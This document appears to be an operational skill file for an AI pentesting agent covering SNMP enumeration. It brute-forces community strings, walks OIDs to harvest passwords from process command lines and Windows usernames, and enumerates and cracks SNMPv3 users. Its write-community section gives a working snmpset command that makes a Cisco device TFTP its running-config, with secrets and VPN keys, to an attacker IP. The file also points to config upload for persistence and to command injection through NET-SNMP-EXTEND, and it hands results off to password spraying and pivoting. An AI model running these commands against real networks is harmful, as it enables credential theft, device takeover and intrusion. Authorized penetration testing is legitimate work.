---
name: snmp-enum
description: Enumerate SNMP services (udp/161, traps udp/162) found by recon — brute community strings with onesixtyone, walk high-value OIDs with snmpwalk/snmpbulkwalk/braa, dump hosts with snmp-check, probe v3 users, test write communities, and hand off subnets, creds-in-cmdlines and findings as rupu work units.
license: Proprietary
compatibility: Linux attack host with net-snmp, onesixtyone, snmp-check, braa; python3 for the parser
metadata:
  author: Section9Labs
  stage: service-enumeration
  trigger-ports: "161/udp, 162/udp"
---

# SNMP Enumeration

Entry condition: recon/host-discovery reports udp/161 open|filtered (nmap `-sU -p161`), or
udp/162 trap listeners, on one or more hosts. Input artifact: `alive.txt` (one IP per line).

Imports (shared reporting pack — use these, do not re-implement):
- `work-units` — consume/emit the work-unit JSON array
- `coverage-assets` — `assets.mark` hosts/services/communities as covered
- `finding-report` — `findings.report` for verified issues

## 1. Community-string discovery (v1/v2c)

Build a community wordlist first. Minimum viable list:

```
printf '%s\n' public private community manager cisco admin snmp snmpd \
  read write rmon default secret monitor agent ILMI tivoli openview > community.txt
```

Append org-derived guesses (company name, site code, `<company>ro`, `<company>rw`) and
anything looted elsewhere. Sweep every alive host against every string in one pass:

```
onesixtyone -c community.txt -i alive.txt -o hits.txt -w 64
```

- `-c` string list, `-i` host list, `-o` log file, `-w` inter-packet wait in ms (lower = faster).
- Output line format: `192.0.2.10 [public] Linux core-sw1 4.19.0 ...` — host, community, sysDescr.
- onesixtyone only proves the string answers; it does not tell you read vs write. Test write later (§6).

Alternative/confirmation with nmap:

```
nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt -iL alive.txt -oA snmp_brute
nmap -sU -p161 --script "snmp-info,snmp-sysdescr" -iL alive.txt -oA snmp_info
```

`snmp-info` also leaks the engine ID / vendor even without a valid community (useful for v3-only agents).

## 2. Version handling

- **v1 / v2c**: auth = community string, cleartext on the wire. `-v1` or `-v2c -c <community>`.
  Always prefer v2c when the agent speaks it: GETBULK makes walks ~10x faster.
- **v3**: user-based (USM). Levels: `noAuthNoPriv`, `authNoPriv`, `authPriv`. A hit needs
  username (+ auth proto/pass, + priv proto/pass depending on level). See §5.
- If v2c with a community fails but the port is open, the agent may be v3-only — nmap
  `snmp-info` will still return the engineID; move to v3 user enumeration.

## 3. Walk the high-value OIDs

For each `(host, community)` hit, pull the trees below. Full OID table with per-vendor extras
in `references/oids.md`. Save every walk to its own file — the parser consumes them.

```
# Whole tree (do this once per host; everything else is targeted re-walks)
snmpbulkwalk -v2c -c public 192.0.2.10 .1 > walk_192.0.2.10_public.txt
# v1 agents don't do GETBULK:
snmpwalk -v1 -c public 192.0.2.10 .1 > walk_192.0.2.10_public.txt
```

Targeted trees and what they yield:

| OID | Tree | Yields |
|---|---|---|
| `1.3.6.1.2.1.1` | system | sysDescr (OS/firmware/version), sysName, sysContact, sysLocation |
| `1.3.6.1.2.1.2` + `1.3.6.1.2.1.4.20` | interfaces, ipAddrTable | every interface + IP/mask → **new subnets** |
| `1.3.6.1.2.1.4.21` / `1.3.6.1.2.1.4.24` | ipRouteTable / ipCidrRoute | routing table → **new subnets, next hops** |
| `1.3.6.1.2.1.6.13`, `1.3.6.1.2.1.7.5` | tcpConnTable, udpTable | live connections and listeners → internal peers |
| `1.3.6.1.2.1.25.4.2.1.2` | hrSWRunName | running process names |
| `1.3.6.1.2.1.25.4.2.1.5` | hrSWRunParameters | **process command lines — passwords, DB conn strings** |
| `1.3.6.1.2.1.25.6.3.1.2` | hrSWInstalledName | installed software + versions |
| `1.3.6.1.4.1.77.1.2.25` | lanmgr | **Windows local usernames** |
| `1.3.6.1.4.1.77.1.2.3.1.1` | lanmgr svc | Windows running services |
| `1.3.6.1.4.1.77.1.2.27` | lanmgr shares | Windows share names |
| `1.3.6.1.2.1.25.2.3.1.3` | hrStorage | mounted filesystems / storage |

```
snmpbulkwalk -v2c -c public 192.0.2.10 1.3.6.1.2.1.25.4.2.1.2 > procs_192.0.2.10.txt
snmpbulkwalk -v2c -c public 192.0.2.10 1.3.6.1.2.1.25.4.2.1.5 >> procs_192.0.2.10.txt
snmpbulkwalk -v2c -c public 192.0.2.10 1.3.6.1.4.1.77.1.2.25  > users_192.0.2.10.txt
snmpbulkwalk -v2c -c public 192.0.2.10 1.3.6.1.2.1.4.21       > routes_192.0.2.10.txt
```

Useful net-snmp flags: `-Oa` print strings as ASCII, `-On` numeric OIDs (feed to tooling),
`-Cr50` bulk repeat count, `-t 2 -r 2` timeout/retries over lossy UDP,
`-m +ALL` load all MIBs for readable names. Grep walks for secrets immediately:

```
grep -iE 'pass|pwd|secret|token|key|community|snmp (set|-c)' procs_*.txt walk_*.txt
```

**Feed interfaces/routes back to host-discovery.** The parser (§7) emits `subnets.txt` for exactly that.

## 4. Fast dumps: snmp-check and braa

Human-readable single-host dump (system, users, processes, net, shares, storage):

```
snmp-check 192.0.2.10 -c public -v 2c -w     # -w also tests write access
snmp-check 192.0.2.10 -c public -v 1
```

Mass OID grab across many hosts/communities — braa is a stripped-down scanner that does
thousands of hosts in seconds (numeric OIDs only, `*` wildcard = walk):

```
braa public@192.0.2.0/24:.1.3.6.1.2.1.1.1.0        # sysDescr sweep of a subnet
braa public@192.0.2.10:.1.3.6.1.2.1.25.4.2.1.5.*   # all process cmdlines, one host
while read h; do echo "public@$h:.1.3.6.1.2.1.1.5.0"; done < alive.txt > braa.in
braa -f braa.in
```

## 5. SNMPv3

Username enumeration: USM returns distinguishable errors for unknown vs known users.

```
nmap -sU -p161 --script snmp-usm-enum --script-args snmp-usm-enum.userdb=users.txt 192.0.2.10
# or probe manually — "Unknown user name" vs auth failure:
snmpwalk -v3 -l noAuthNoPriv -u admin 192.0.2.10 2>&1 | head -1
```

Try `noAuthNoPriv` first — misconfigured agents allow full walks with just a valid username:

```
snmpwalk -v3 -l noAuthNoPriv -u snmpuser 192.0.2.10 1.3.6.1.2.1.1
```

Full authPriv walk once creds are known/cracked (auth: MD5|SHA|SHA-256; priv: DES|AES):

```
snmpwalk -v3 -l authPriv -u snmpadmin -a SHA -A 'AuthPass123' -x AES -X 'PrivPass123' 192.0.2.10 .1
snmpwalk -v3 -l authNoPriv -u snmpadmin -a MD5 -A 'AuthPass123' 192.0.2.10 1.3.6.1.2.1.1
```

Offline cracking: capture SNMPv3 on the wire (tcpdump udp/161-162) and run hashcat modes
25100/25200 (SNMPv3 HMAC-MD5/SHA) against the usmUserTable handshakes.

## 6. Write communities — test and exploit

Test write by setting a harmless-but-reversible value (sysContact), then restore:

```
snmpget -v2c -c private 192.0.2.10 1.3.6.1.2.1.1.4.0                 # save original
snmpset -v2c -c private 192.0.2.10 1.3.6.1.2.1.1.4.0 s "probe-rw"    # succeeds => RW
snmpset -v2c -c private 192.0.2.10 1.3.6.1.2.1.1.4.0 s "<original>"  # restore
```

Impact with a write community:
- **Cisco config exfil via CISCO-CONFIG-COPY-MIB (1.3.6.1.4.1.9.9.96)** — order the device
  to TFTP its running-config to you (contains type-7/secret hashes, SNMP strings, VPN keys):

```
R=$RANDOM; ATTACKER=203.0.113.5
snmpset -v2c -c private 192.0.2.1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.$R i 1  1.3.6.1.4.1.9.9.96.1.1.1.1.3.$R i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.$R i 1  1.3.6.1.4.1.9.9.96.1.1.1.1.5.$R a $ATTACKER \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.$R s backup.cfg  1.3.6.1.4.1.9.9.96.1.1.1.1.14.$R i 4
snmpget -v2c -c private 192.0.2.1 1.3.6.1.4.1.9.9.96.1.1.1.1.10.$R   # 3 = success
```

  (Run a TFTP server first: `atftpd --daemon --port 69 /tmp/tftp` or metasploit tftp.)
  Reverse direction (set `.3.$R i 1`, `.4.$R i 4`) uploads *your* config — persistence/RCE on IOS.
- Older IOS: `1.3.6.1.4.1.9.2.1.55.<tftp-ip> s <filename>` (OLD-CISCO-SYS-MIB writeNet).
- Linux net-snmp with rw + NET-SNMP-EXTEND-MIB: inject `nsExtendObjects` entries → command
  execution on walk (see `references/oids.md` §write-abuse).

## 7. Parse, hand off, report

```
python3 scripts/parse_snmp.py --out-dir snmp_out \
  --hits hits.txt \
  --walk 192.0.2.10=walk_192.0.2.10_public.txt \
  --check 192.0.2.10=snmpcheck_192.0.2.10.txt \
  --write-community 192.0.2.10=private
```

Outputs in `snmp_out/`:
- `snmp_enum.json` — per-host records `{host, community, version, sysdescr, users, processes, routes, write_community}`
- `subnets.txt` — discovered subnets, one per line → re-feed to host-discovery
- `work_units.json` — clean JSON array `[{id,title,targets,hints}]`

Handoff per `references/rupu.md`:
- feed `work_units.json` to a rupu `for_each:` (via `read_file`) or a lead's `dispatch`;
- `assets.mark` every host:161/udp, each valid `(host,community,version)` and discovered subnet;
- `findings.report`: default/guessable community (read), **write community** (high), SNMP info
  leak (users/cmdline creds/routes), v3 noAuthNoPriv access.

Downstream: usernames → password spraying; cmdline creds → direct auth; subnets → host-discovery;
Cisco configs → cred cracking + network pivot; Windows shares/users → smb-enum.
